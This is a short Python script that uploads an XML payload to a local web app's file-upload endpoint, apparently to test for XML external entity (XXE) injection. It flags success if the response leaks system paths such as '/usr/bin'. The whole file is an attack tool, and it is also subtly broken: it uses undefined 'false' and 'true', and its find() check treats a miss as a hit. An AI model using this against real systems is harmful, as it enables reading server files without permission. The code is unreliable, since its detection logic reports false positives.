import requests
import time
import sys


site = "http://localhost:3000/"
#filename="payload.xml" -- if you run the script from the same folder
filename="attack_resources/payload.xml"

def upload_file(site):
    is_vulnerable=false
    site = site+"file-upload"
    files = {'file': open(filename, 'rb')}
    response = requests.post(site, files=files)
    if (response.text.find("/usr/bin")) :
        print("xxe is possible!")
        is_vulnerable=true
    return is_vulnerable

#r = requests.get(site)
#time.sleep(2)
#print("the site is online")
#upload_file("payload.xml", site + "file-upload")
#
##send a request to upload payload.xml and get the response
